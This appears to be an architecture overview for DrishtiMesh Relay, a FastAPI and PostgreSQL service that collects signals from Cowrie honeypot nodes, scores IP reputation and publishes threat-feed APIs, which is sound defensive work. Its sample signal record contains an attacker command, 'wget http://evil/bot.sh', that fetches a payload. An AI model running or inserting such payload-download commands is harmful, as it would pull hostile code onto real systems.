# DrishtiMesh Relay API — Architecture Overview

## What We Built

DrishtiMesh Relay is the central intelligence layer of the DrishtiMesh network.

It receives verified signals from distributed honeypot nodes, processes reputation scoring, stores threat intelligence, and exposes public APIs for lookup and observability.

The current V1 backend includes:

- Node registration
- Node authentication
- Secure signal ingestion
- Reputation scoring
- Threat feed APIs
- Network statistics
- Heartbeat monitoring

---

# Core Architecture

```text
Community Node (Cowrie VPS)
        │
        │  Secure Signal Submission
        ▼
DrishtiMesh Relay API (FastAPI)
        │
        ├── Signal Processing
        ├── Reputation Engine
        ├── Node Authentication
        ├── Feed Generation
        └── Lookup APIs
        │
        ▼
PostgreSQL Intelligence Store
```

---

# Current Components

## 1. Relay API

### Technology

```text
FastAPI
Uvicorn
PostgreSQL
psycopg2
```

### Purpose

```text
Central intelligence relay
Signal ingestion
IP reputation calculation
Public intelligence APIs
```

### Current Endpoints

```text
POST /nodes/register
POST /nodes/heartbeat
POST /signals

GET /lookup/{ip}
GET /feed/recent
GET /network/stats
GET /health
GET /db-check
```

---

# 2. Node System

Nodes represent independent community sensors.

Each node contains:

```text
Cowrie honeypot
Signal agent
Node token
Heartbeat service
Local raw logs
```

### Current Node Flow

```text
Register node
↓
Receive API token
↓
Authenticate with relay
↓
Submit signals
↓
Maintain heartbeat
```

---

# 3. Authentication Model

Each node receives:

```text
node_id
api_token
```

Signal ingestion requires:

```http
Authorization: Bearer NODE_TOKEN
```

### Verification Process

```text
Validate node_id
Validate token
Allow signal submission
```

Unauthenticated submissions are rejected.

---

# 4. Signal Pipeline

## Current Flow

```text
Cowrie Event
↓
Signal Agent
↓
POST /signals
↓
Signal Stored
↓
Reputation Recalculated
↓
Feed Updated
```

---

# Signal Structure

Current signal model:

```json
{
  "node_id": "uuid",
  "src_ip": "45.153.34.114",
  "sensor": "cowrie",
  "eventid": "cowrie.command.input",
  "signal_type": "payload_download_attempt",
  "severity": "high",
  "confidence": 90,
  "raw_command": "wget http://evil/bot.sh",
  "metadata": {
    "tool": "wget"
  }
}
```

---

# Supported Signal Categories

Current V1 categories:

```text
ssh_bruteforce
interactive_access
system_reconnaissance
network_reconnaissance
payload_download_attempt
payload_download_confirmed
payload_upload
permission_change
execution_attempt
persistence_attempt
sensitive_file_access
destructive_command
evasion_attempt
proxy_or_tunnel_attempt
```

---

# Reputation Engine

## Current Logic

Signals are weighted using predefined values.

### Example

```text
payload_download_attempt = 40
execution_attempt = 45
destructive_command = 70
```

### Multi-node Observation Bonus

```text
+20 score boost
```

### Maximum Score

```text
100
```

---

# Reputation Verdicts

```text
0–29   → low_risk
30–59  → suspicious
60–84  → high_risk
85–100 → malicious
```

---

# Database Architecture

## Tables

### nodes

Stores:

```text
node identity
sensor type
provider
region
api token
status
last seen
```

---

### node_heartbeats

Stores:

```text
heartbeat history
node status
version tracking
```

---

### signals

Core intelligence table.

Stores:

```text
source IP
signal type
Cowrie event ID
confidence
severity
metadata
timestamps
```

---

### ip_reputation

Stores calculated intelligence:

```text
score
verdict
confidence
node count
signal totals
last seen
```

---

# Public Intelligence APIs

## Lookup API

```http
GET /lookup/{ip}
```

Returns:

```text
score
verdict
confidence
signal evidence
node count
timestamps
```

---

## Threat Feed API

```http
GET /feed/recent
```

Returns:

```text
latest signals
severity
verdict
confidence
reputation score
```

---

## Network Statistics API

```http
GET /network/stats
```

Returns:

```text
active nodes
total signals
malicious IPs
suspicious IPs
24h activity
```

---

# Current Security Model

## Protected Endpoints

```text
/signals
/nodes/heartbeat
```

### Authentication

```text
Bearer Token Validation
```

---

# Current Deployment Model

## Relay Server

Runs:

```text
Ubuntu
FastAPI
Uvicorn
PostgreSQL
```

---

## Node Deployment

Current target:

```text
Ubuntu VPS
Docker
Cowrie
Signal Agent
```

### Future Deployment

```text
One-command installer
```

Example:

```bash
curl -sSL https://install.drishtimesh.io | bash
```

---

# Current V1 Capabilities

## Completed

```text
Relay API
Database integration
Signal ingestion
Node registration
Heartbeat system
Token authentication
IP reputation engine
Public lookup APIs
Threat feed
Network statistics
```

---

# Next Major Phase

## Node Agent

### Purpose

```text
Read Cowrie logs
Extract signals
Classify commands
Send signals automatically
```

### Pipeline

```text
cowrie.json
↓
signal-agent
↓
classification engine
↓
POST /signals
```

---

# Future Roadmap

## Planned

```text
Cowrie auto-deployment
Signal agent daemon
Installer service
Web dashboard
Campaign clustering
Threat timelines
Geo correlation
Sensor analytics
GhostTrap integration
T-Pot support
AbuseIPDB integration
External intelligence providers
```

---

# Long-Term Vision

DrishtiMesh is designed as:

```text
A distributed threat observability mesh
powered by community-operated nodes
with explainable intelligence and reputation scoring.
```

### Objective

```text
Collect threat visibility
without centralizing raw honeypot telemetry.
```

Only normalized intelligence signals are shared with the network.
